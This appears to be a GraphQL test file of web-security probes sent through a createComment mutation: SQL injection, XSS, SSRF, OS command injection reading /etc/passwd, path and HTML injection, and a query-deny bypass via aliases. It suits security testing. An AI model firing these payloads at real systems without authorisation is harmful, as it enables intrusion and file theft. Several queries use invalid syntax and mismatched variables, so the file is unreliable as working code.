query.query:
mutation createComment($comment: String!) {
  createComment(input: { comment: $comment }) {
    id
  }
}

# arguments must be wrapped in variables, here I'm using a variable named $comment and providing a literal value
variable $comment = "This is a basic call"

mutation createComment($id: ID!) {
  createComment(input: { comment: "1' OR id = '1'" }) {
    id
  }
}

# In this example, the SQL injection is in the comment field, by using ' OR id = '1' any condition could be bypassed
variable $id = "ID!"

mutation createComment($xss: String!) {
  createComment(input: { comment: $xss }) {
    id
  }
}

# In this example, the XSS is in the comment field, by using <script>alert('xss')</script> any script could be injected
variable $xss = "<script>alert('xss')</script>"

mutation createComment($url: String!) {
  createComment(input: { comment: $url }) {
    id
  }
}

# In this example, the SSRF injection is in the URL field, by using http://remote-server.com any vulnerable SSRF could be fraudulent
variable $url = "http://remote-server.com"

mutation createComment($command: String!) {
  createComment(input: { comment: $command }) {
    id
  }
}

# In this example the OS Command Injection is in the comment field, by using; cat /etc/passwd, any system command could be injected
variable $command = "cat /etc/passwd;"

mutation createComment($path: String!) {
  createComment(input: { comment: $path }) {
    id
  }
}

# In this example the Path Injection is in the Comment field, by using provisions/users-role-manager, any path could be resolved
variable $path = "provisions/users-role-manager"

mutation createComment($html: String!) {
  createComment(input: { comment: $html }) {
    id
  }
}

# In this example, the HTML Injection is in the Comment field, by using <h1>Hello, World!</h1> any HTML string could be injected
variable $html = "<h1>Hello, World!</h1>"

mutation createComment($flag: Boolean!) {
  createComment(input: { comment: $flag }) {
    id
  }
}

# In this example we are testing if there is a query deny bypass by setting the $flag variable to true or false
variable $flag = true

mutation createComment : queryDenyBypass {
  queryDenyBypass: createComment(input: { comment: $flag }) {
    id
  }
}

# In this example we are testing the same vulnerability, but with query aliases. We should notice that it's the same query
variable $flag = false

mutation createComment {
  createComment(input: { comment: "" }) {
    id
    suggestions
  }
}
